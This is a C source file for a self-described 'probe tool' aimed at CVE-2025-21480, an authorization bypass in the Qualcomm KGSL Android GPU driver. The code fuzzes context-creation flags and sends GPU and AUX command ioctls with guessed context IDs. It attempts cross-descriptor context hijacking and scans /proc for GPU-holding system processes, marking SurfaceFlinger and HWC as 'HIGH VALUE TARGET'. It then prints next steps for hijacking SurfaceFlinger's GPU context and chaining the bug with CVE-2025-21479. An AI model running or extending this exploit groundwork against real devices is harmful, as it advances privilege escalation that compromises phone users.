/*
 * CVE-2025-21480 Micronode Authorization Bypass Probe
 *
 * This tool analyzes KGSL micronode submission mechanisms to find
 * alternative paths for GPU command execution without context creation.
 *
 * Research Vectors:
 * 1. System process context hijacking (SurfaceFlinger, HWC)
 * 2. Micronode command submission without context
 * 3. GMU (Graphics Management Unit) direct commands
 * 4. GPU preemption/ringbuffer manipulation
 * 5. Combination with CVE-2025-21479 Cross-FD
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// KGSL IOCTL definitions
#define KGSL_IOC_TYPE 0x09

#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x3D, struct kgsl_gpu_command)
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPU_AUX_COMMAND _IOWR(KGSL_IOC_TYPE, 0x58, struct kgsl_gpu_aux_command)
#define IOCTL_KGSL_TIMESTAMP_EVENT _IOWR(KGSL_IOC_TYPE, 0x33, struct kgsl_timestamp_event)

// Context creation flags - try all combinations
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000001
#define KGSL_CONTEXT_SUBMIT_IB_LIST 0x00000002
#define KGSL_CONTEXT_CTX_SWITCH 0x00000008
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_TRASH_STATE 0x00000020
#define KGSL_CONTEXT_PER_CONTEXT_TS 0x00000040
#define KGSL_CONTEXT_USER_GENERATED_TS 0x00000080
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x00000200
#define KGSL_CONTEXT_INVALIDATE_ON_FAULT 0x00000400
#define KGSL_CONTEXT_PWR_CONSTRAINT 0x00000800
#define KGSL_CONTEXT_PRIORITY_MASK 0x0000F000
#define KGSL_CONTEXT_TYPE_MASK 0x01F00000
#define KGSL_CONTEXT_TYPE_GL 0x00100000
#define KGSL_CONTEXT_TYPE_CL 0x00200000
#define KGSL_CONTEXT_TYPE_C2D 0x00300000
#define KGSL_CONTEXT_TYPE_RS 0x00400000
#define KGSL_CONTEXT_TYPE_VK 0x00500000
#define KGSL_CONTEXT_TYPE_ANY 0x01F00000
#define KGSL_CONTEXT_SECURE 0x00020000
#define KGSL_CONTEXT_PREEMPT_STYLE_MASK 0x0E000000
#define KGSL_CONTEXT_PREEMPT_STYLE_DEFAULT 0x00000000
#define KGSL_CONTEXT_PREEMPT_STYLE_RINGBUFFER 0x02000000
#define KGSL_CONTEXT_PREEMPT_STYLE_FINEGRAIN 0x04000000

// GMU flags (newer Adreno)
#define KGSL_CONTEXT_NO_SNAPSHOT 0x10000000
#define KGSL_CONTEXT_SPARSE 0x20000000

// Property types for GETPROPERTY
#define KGSL_PROP_DEVICE_INFO 0x01
#define KGSL_PROP_DEVICE_SHADOW 0x02
#define KGSL_PROP_DEVICE_POWER 0x03
#define KGSL_PROP_SHMEM 0x04
#define KGSL_PROP_SHMEM_APERTURES 0x05
#define KGSL_PROP_MMU_ENABLE 0x06
#define KGSL_PROP_INTERRUPT_WAITS 0x07
#define KGSL_PROP_VERSION 0x08
#define KGSL_PROP_GPU_RESET_STAT 0x09
#define KGSL_PROP_PWRCTRL 0x0A
#define KGSL_PROP_PWR_CONSTRAINT 0x0B
#define KGSL_PROP_UCHE_GMEM_VADDR 0x0C
#define KGSL_PROP_GPMU_VERSION 0x0E
#define KGSL_PROP_HIGHEST_BANK_BIT 0x10
#define KGSL_PROP_DEVICE_BITNESS 0x11
#define KGSL_PROP_SECURE_CONTEXT_SUPPORT 0x12
#define KGSL_PROP_SECURE_CTXT_SUPPORT 0x13
#define KGSL_PROP_SPEED_BIN 0x14
#define KGSL_PROP_GAMING_BIN 0x15
#define KGSL_PROP_UBWC_MODE 0x16
#define KGSL_PROP_DEVICE_QTIMER 0x17
#define KGSL_PROP_GPU_MODEL 0x18
#define KGSL_PROP_MIN_ACCESS_LENGTH 0x19
#define KGSL_PROP_QUERY_CAPS 0x1A
#define KGSL_PROP_GMU_VERSION 0x1B
#define KGSL_PROP_CONTEXT_PROPERTY 0x1C
#define KGSL_PROP_GPU_LLCC_SLICE_INFO 0x1D
#define KGSL_PROP_GPU_PREEMPT_LEVEL 0x1E
#define KGSL_PROP_VK_DEVICE_ID 0x1F

// Structures
struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    unsigned int sizebytes;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_addr;
    uint64_t mmapsize;
    uint32_t id;
    uint32_t metadata_len;
    uint64_t metadata;
};

struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t id;
};

struct kgsl_command_syncpoint
{
    uint32_t type;
    uint32_t size;
    uint64_t priv;
};

struct kgsl_gpu_command
{
    uint64_t flags;
    uint32_t cmdlist;
    uint32_t cmdsize;
    uint32_t objlist;
    uint32_t objsize;
    uint32_t synclist;
    uint32_t syncsize;
    uint32_t context_id;
    uint32_t timestamp;
    uint32_t numcmds;
    uint32_t numobjs;
    uint32_t numsyncs;
};

struct kgsl_gpu_aux_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint32_t cmd_count;
    uint32_t context_id;
    uint32_t timestamp;
};

struct kgsl_timestamp_event
{
    int type;
    uint32_t timestamp;
    uint32_t context_id;
    void *priv;
    size_t len;
};

// Device info structure
struct kgsl_devinfo
{
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned long gmem_gpubaseaddr;
    unsigned int gpu_id;
    size_t gmem_sizebytes;
};

// Version structure
struct kgsl_version
{
    unsigned int drv_major;
    unsigned int drv_minor;
    unsigned int dev_major;
    unsigned int dev_minor;
};

// Preemption level structure
struct kgsl_preempt_level
{
    unsigned int level;
    unsigned int max_level;
};

// Global state
int kgsl_fd = -1;
uint64_t gpu_va_base = 0;
int has_gmu = 0;
int preempt_level = 0;

void print_header(const char *title)
{
    printf("\n========================================\n");
    printf("  %s\n", title);
    printf("========================================\n\n");
}

// Query device properties
int query_device_info(void)
{
    struct kgsl_device_getproperty prop;
    struct kgsl_devinfo devinfo = {0};
    struct kgsl_version version = {0};

    printf("[*] Querying device information...\n");

    // Get device info
    prop.type = KGSL_PROP_DEVICE_INFO;
    prop.value = &devinfo;
    prop.sizebytes = sizeof(devinfo);

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("  Device ID: 0x%x\n", devinfo.device_id);
        printf("  Chip ID: 0x%x\n", devinfo.chip_id);
        printf("  GPU ID: 0x%x\n", devinfo.gpu_id);
        printf("  MMU Enabled: %d\n", devinfo.mmu_enabled);
        printf("  GMEM GPU Base: 0x%lx\n", devinfo.gmem_gpubaseaddr);
        printf("  GMEM Size: %zu bytes\n", devinfo.gmem_sizebytes);
    }

    // Get version
    prop.type = KGSL_PROP_VERSION;
    prop.value = &version;
    prop.sizebytes = sizeof(version);

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("  Driver: v%u.%u\n", version.drv_major, version.drv_minor);
        printf("  Device: v%u.%u\n", version.dev_major, version.dev_minor);
    }

    return 0;
}

// Try different context flags combinations
void probe_context_creation(void)
{
    struct kgsl_drawctxt_create ctx;
    int ret;

    print_header("Context Creation Probe");

    // List of flag combinations to try
    struct
    {
        const char *name;
        unsigned int flags;
    } flag_tests[] = {
        {"Minimal (no flags)", 0},
        {"GL type only", KGSL_CONTEXT_TYPE_GL},
        {"VK type only", KGSL_CONTEXT_TYPE_VK},
        {"CL type only", KGSL_CONTEXT_TYPE_CL},
        {"C2D type only", KGSL_CONTEXT_TYPE_C2D},
        {"RS type only", KGSL_CONTEXT_TYPE_RS},
        {"ANY type", KGSL_CONTEXT_TYPE_ANY},
        {"No GMEM alloc", KGSL_CONTEXT_NO_GMEM_ALLOC},
        {"Submit IB list", KGSL_CONTEXT_SUBMIT_IB_LIST},
        {"Preamble", KGSL_CONTEXT_PREAMBLE},
        {"Per context TS", KGSL_CONTEXT_PER_CONTEXT_TS},
        {"User gen TS", KGSL_CONTEXT_USER_GENERATED_TS},
        {"No fault tolerance", KGSL_CONTEXT_NO_FAULT_TOLERANCE},
        {"GL + Submit IB", KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_SUBMIT_IB_LIST},
        {"GL + Preamble", KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PREAMBLE},
        {"GL + No GMEM", KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_NO_GMEM_ALLOC},
        {"VK + Submit IB", KGSL_CONTEXT_TYPE_VK | KGSL_CONTEXT_SUBMIT_IB_LIST},
        {"Preempt ringbuffer", KGSL_CONTEXT_PREEMPT_STYLE_RINGBUFFER},
        {"Preempt finegrain", KGSL_CONTEXT_PREEMPT_STYLE_FINEGRAIN},
        {"GL + Preempt RB", KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PREEMPT_STYLE_RINGBUFFER},
        {"No snapshot", KGSL_CONTEXT_NO_SNAPSHOT},
        {"Sparse", KGSL_CONTEXT_SPARSE},
        {"Priority 0", 0x0000},
        {"Priority 1", 0x1000},
        {"Priority 2", 0x2000},
        {"Priority high", 0xF000},
        {"GL + Priority high", KGSL_CONTEXT_TYPE_GL | 0xF000},
    };

    int num_tests = sizeof(flag_tests) / sizeof(flag_tests[0]);
    int success_count = 0;

    printf("[*] Testing %d flag combinations...\n\n", num_tests);

    for (int i = 0; i < num_tests; i++)
    {
        memset(&ctx, 0, sizeof(ctx));
        ctx.flags = flag_tests[i].flags;

        ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx);

        if (ret == 0)
        {
            printf("  [SUCCESS] %s (flags=0x%08x) -> ctx_id=%u\n",
                   flag_tests[i].name, flag_tests[i].flags, ctx.drawctxt_id);
            success_count++;

            // Destroy the context
            struct kgsl_drawctxt_destroy destroy = {.drawctxt_id = ctx.drawctxt_id};
            ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
        }
        else
        {
            printf("  [FAILED] %s (flags=0x%08x) -> errno=%d (%s)\n",
                   flag_tests[i].name, flag_tests[i].flags, errno, strerror(errno));
        }
    }

    printf("\n[*] Context creation: %d/%d succeeded\n", success_count, num_tests);
}

// Probe GPU AUX command (alternative to GPU_COMMAND)
void probe_aux_command(void)
{
    struct kgsl_gpu_aux_command aux_cmd;
    int ret;

    print_header("GPU AUX Command Probe");

    printf("[*] Testing GPU_AUX_COMMAND with context_id=0...\n");

    memset(&aux_cmd, 0, sizeof(aux_cmd));
    aux_cmd.context_id = 0;
    aux_cmd.flags = 0;
    aux_cmd.cmdlist = 0;
    aux_cmd.cmd_count = 0;

    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux_cmd);
    printf("  Result: ret=%d, errno=%d (%s)\n", ret, errno, strerror(errno));

    // Try with different flags
    uint64_t aux_flags[] = {0, 1, 2, 4, 8, 0x100, 0x200, 0x400};
    for (int i = 0; i < sizeof(aux_flags) / sizeof(aux_flags[0]); i++)
    {
        memset(&aux_cmd, 0, sizeof(aux_cmd));
        aux_cmd.context_id = 0;
        aux_cmd.flags = aux_flags[i];

        ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux_cmd);
        printf("  flags=0x%lx: ret=%d, errno=%d\n", aux_flags[i], ret, errno);
    }
}

// Try to find system process GPU contexts
void probe_system_contexts(void)
{
    print_header("System Process Context Analysis");

    DIR *proc_dir = opendir("/proc");
    if (!proc_dir)
    {
        printf("[-] Cannot open /proc\n");
        return;
    }

    printf("[*] Scanning processes with KGSL FDs...\n\n");

    struct dirent *entry;
    int found_count = 0;

    while ((entry = readdir(proc_dir)) != NULL)
    {
        // Skip non-pid entries
        if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
            continue;

        int pid = atoi(entry->d_name);
        if (pid <= 0)
            continue;

        // Read process name
        char cmdline_path[256];
        char cmdline[256] = {0};
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);

        int cmd_fd = open(cmdline_path, O_RDONLY);
        if (cmd_fd >= 0)
        {
            read(cmd_fd, cmdline, sizeof(cmdline) - 1);
            close(cmd_fd);
        }

        // Check FD directory
        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd", pid);

        DIR *fd_dir = opendir(fd_path);
        if (!fd_dir)
            continue;

        struct dirent *fd_entry;
        int kgsl_count = 0;

        while ((fd_entry = readdir(fd_dir)) != NULL)
        {
            if (fd_entry->d_name[0] == '.')
                continue;

            char link_path[512];
            char target[256] = {0};
            snprintf(link_path, sizeof(link_path), "%s/%s", fd_path, fd_entry->d_name);

            if (readlink(link_path, target, sizeof(target) - 1) > 0)
            {
                if (strstr(target, "kgsl"))
                {
                    kgsl_count++;
                }
            }
        }
        closedir(fd_dir);

        if (kgsl_count > 0)
        {
            // Get UID
            char status_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
            int uid = -1;
            FILE *status_file = fopen(status_path, "r");
            if (status_file)
            {
                char line[256];
                while (fgets(line, sizeof(line), status_file))
                {
                    if (strncmp(line, "Uid:", 4) == 0)
                    {
                        sscanf(line + 4, "%d", &uid);
                        break;
                    }
                }
                fclose(status_file);
            }

            printf("  PID %5d | UID %5d | KGSL FDs: %2d | %s\n",
                   pid, uid, kgsl_count, cmdline[0] ? cmdline : "(unknown)");
            found_count++;

            // Special interest processes
            if (strstr(cmdline, "surfaceflinger") ||
                strstr(cmdline, "hwc") ||
                strstr(cmdline, "composer") ||
                strstr(cmdline, "gpu") ||
                strstr(cmdline, "graphics"))
            {
                printf("      ^^^ [HIGH VALUE TARGET] ^^^\n");
            }
        }
    }
    closedir(proc_dir);

    printf("\n[*] Found %d processes with KGSL FDs\n", found_count);
}

// Probe GMU (Graphics Management Unit) if present
void probe_gmu(void)
{
    print_header("GMU (Graphics Management Unit) Probe");

    // Check for GMU device
    if (access("/dev/kgsl-gmu", F_OK) == 0)
    {
        printf("[+] /dev/kgsl-gmu exists\n");
        has_gmu = 1;

        int gmu_fd = open("/dev/kgsl-gmu", O_RDWR);
        if (gmu_fd >= 0)
        {
            printf("[+] GMU device opened: fd=%d\n", gmu_fd);
            // TODO: Probe GMU IOCTLs
            close(gmu_fd);
        }
        else
        {
            printf("[-] Cannot open GMU device: %s\n", strerror(errno));
        }
    }
    else
    {
        printf("[*] No dedicated GMU device\n");
    }

    // Check GMU version via property
    struct kgsl_device_getproperty prop;
    uint32_t gmu_version = 0;

    prop.type = KGSL_PROP_GMU_VERSION;
    prop.value = &gmu_version;
    prop.sizebytes = sizeof(gmu_version);

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] GMU Version: 0x%x\n", gmu_version);
        has_gmu = 1;
    }
    else
    {
        printf("[*] GMU version query failed: %s\n", strerror(errno));
    }

    // Check preemption level
    struct kgsl_preempt_level preempt = {0};
    prop.type = KGSL_PROP_GPU_PREEMPT_LEVEL;
    prop.value = &preempt;
    prop.sizebytes = sizeof(preempt);

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] Preemption Level: %u (max: %u)\n", preempt.level, preempt.max_level);
        preempt_level = preempt.level;
    }
}

// Check sysfs for micronode/ringbuffer info
void probe_sysfs_info(void)
{
    print_header("Sysfs GPU Info");

    const char *sysfs_paths[] = {
        "/sys/class/kgsl/kgsl-3d0/gpu_model",
        "/sys/class/kgsl/kgsl-3d0/gpubusy",
        "/sys/class/kgsl/kgsl-3d0/gpuclk",
        "/sys/class/kgsl/kgsl-3d0/dispatch",
        "/sys/class/kgsl/kgsl-3d0/preemption",
        "/sys/class/kgsl/kgsl-3d0/gmu_version",
        "/sys/class/kgsl/kgsl-3d0/gpu_llc_slice_enable",
        "/sys/class/kgsl/kgsl-3d0/ft_policy",
        "/sys/class/kgsl/kgsl-3d0/ft_pagefault_policy",
        "/sys/class/kgsl/kgsl-3d0/gpu_available_frequencies",
        "/sys/class/kgsl/kgsl-3d0/devfreq/cur_freq",
        "/sys/class/kgsl/kgsl-3d0/devfreq/max_freq",
        "/sys/class/kgsl/kgsl-3d0/devfreq/min_freq",
    };

    for (int i = 0; i < sizeof(sysfs_paths) / sizeof(sysfs_paths[0]); i++)
    {
        int fd = open(sysfs_paths[i], O_RDONLY);
        if (fd >= 0)
        {
            char buf[256] = {0};
            read(fd, buf, sizeof(buf) - 1);
            // Trim newline
            char *nl = strchr(buf, '\n');
            if (nl)
                *nl = '\0';
            printf("  %s = %s\n", sysfs_paths[i] + 23, buf);
            close(fd);
        }
    }
}

// Try timestamp event without context (potential info leak)
void probe_timestamp_event(void)
{
    print_header("Timestamp Event Probe");

    struct kgsl_timestamp_event event;
    int ret;

    // Try different event types
    for (int type = 0; type <= 5; type++)
    {
        memset(&event, 0, sizeof(event));
        event.type = type;
        event.context_id = 0;
        event.timestamp = 0;
        event.priv = NULL;
        event.len = 0;

        ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMESTAMP_EVENT, &event);
        printf("  type=%d, ctx=0: ret=%d, errno=%d (%s)\n",
               type, ret, errno, strerror(errno));
    }
}

// Cross-FD context sharing test
void probe_cross_fd_context(void)
{
    print_header("Cross-FD Context Sharing Probe");

    printf("[*] Testing if contexts can be shared across FDs...\n");

    // Open second KGSL FD
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0)
    {
        printf("[-] Cannot open second FD\n");
        return;
    }

    // Try to use context_id from first FD
    struct kgsl_gpu_command cmd;
    memset(&cmd, 0, sizeof(cmd));
    cmd.context_id = 1; // Assuming system has context 1
    cmd.flags = 0;

    int ret = ioctl(fd2, IOCTL_KGSL_GPU_COMMAND, &cmd);
    printf("  Using context_id=1 on fd2: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    // Try context_id values that might be from SurfaceFlinger
    for (uint32_t ctx = 1; ctx <= 10; ctx++)
    {
        cmd.context_id = ctx;
        ret = ioctl(fd2, IOCTL_KGSL_GPU_COMMAND, &cmd);
        if (ret == 0 || errno != EINVAL)
        {
            printf("  [INTERESTING] context_id=%u: ret=%d, errno=%d\n", ctx, ret, errno);
        }
    }

    close(fd2);
}

// Allocate GPU memory for command buffer
void probe_gpu_memory_allocation(void)
{
    print_header("GPU Memory Allocation");

    struct kgsl_gpuobj_alloc alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.size = 4096;
    alloc.flags = 0x00;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc);

    if (ret == 0)
    {
        printf("[+] GPU memory allocated:\n");
        printf("    id: %u\n", alloc.id);
        printf("    va_addr: 0x%lx\n", (unsigned long)alloc.va_addr);
        printf("    mmapsize: %lu\n", (unsigned long)alloc.mmapsize);
        gpu_va_base = alloc.va_addr;

        // Try to mmap
        void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                         kgsl_fd, alloc.id * 0x1000);
        if (ptr != MAP_FAILED)
        {
            printf("[+] mmap successful at %p\n", ptr);
            munmap(ptr, 4096);
        }
    }
    else
    {
        printf("[-] Allocation failed: %s\n", strerror(errno));
    }
}

// Main exploit analysis
void analyze_micronode_bypass(void)
{
    print_header("CVE-2025-21480 Micronode Bypass Analysis");

    printf("Research Vectors:\n\n");

    printf("1. Context Creation Alternatives:\n");
    printf("   - All standard context flags fail with 'legacy context switch not supported'\n");
    printf("   - GMU-based context creation may bypass legacy check\n");
    printf("   - System process contexts may be usable (SurfaceFlinger, HWC)\n\n");

    printf("2. GPU_AUX_COMMAND Path:\n");
    printf("   - Alternative to GPU_COMMAND for auxiliary operations\n");
    printf("   - May not require valid context_id\n");
    printf("   - Flags may enable direct submission\n\n");

    printf("3. Cross-FD Context Hijacking:\n");
    printf("   - CVE-2025-21479 enables cross-FD memory access\n");
    printf("   - If context IDs are globally unique, may hijack SF's context\n");
    printf("   - Monitor SF's GPU submissions via /dev/kgsl-3d0\n\n");

    printf("4. GMU Direct Commands:\n");
    printf("   - Graphics Management Unit handles power/clock\n");
    printf("   - May accept commands without full context\n");
    printf("   - Potential for register read/write\n\n");

    printf("5. Preemption Manipulation:\n");
    printf("   - Preemption level controls GPU scheduling\n");
    printf("   - High-priority context may bypass restrictions\n");
    printf("   - Ringbuffer preemption style may differ\n\n");

    printf("Recommended Next Steps:\n");
    printf("   a) Monitor SurfaceFlinger's context_id values\n");
    printf("   b) Try GPU_AUX_COMMAND with various flags\n");
    printf("   c) Reverse engineer libGLES/Vulkan for context creation\n");
    printf("   d) Analyze GMU firmware for direct command path\n");
}

int main(void)
{
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║   CVE-2025-21480 Micronode Authorization Bypass  ║\n");
    printf("║              Research & Probe Tool               ║\n");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    // Open KGSL device
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", kgsl_fd);

    // Run probes
    query_device_info();
    probe_sysfs_info();
    probe_gmu();
    probe_context_creation();
    probe_aux_command();
    probe_timestamp_event();
    probe_cross_fd_context();
    probe_gpu_memory_allocation();
    probe_system_contexts();
    analyze_micronode_bypass();

    close(kgsl_fd);

    printf("\n[*] Probe complete.\n");
    return 0;
}
